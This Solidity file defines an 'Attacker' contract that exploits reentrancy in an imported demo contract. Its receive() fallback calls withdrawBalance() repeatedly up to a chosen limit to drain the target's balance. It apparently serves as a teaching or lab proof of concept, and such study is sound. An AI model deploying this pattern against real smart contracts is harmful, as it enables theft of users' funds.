// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./Reentrancy.sol";

contract Attacker {
    Reentrancy reentrancyContract;

    event LogReceived(uint256 amount, uint256 indexed counter);
    uint256 public counter = 0;
    uint256 public limit = 0;

    constructor(address payable reentrancyContractAddress) {
        reentrancyContract = Reentrancy(reentrancyContractAddress);
    }


    receive() external payable {
        emit LogReceived(msg.value, counter);
        if (counter < limit) {
            counter++;
            reentrancyContract.withdrawBalance();
        }
    }

    function deposit() external payable {
        reentrancyContract.deposit{value: msg.value}();
    }

    function withdraw(uint256 limit_) payable external {
        limit = limit_;
        reentrancyContract.withdrawBalance();
    }
}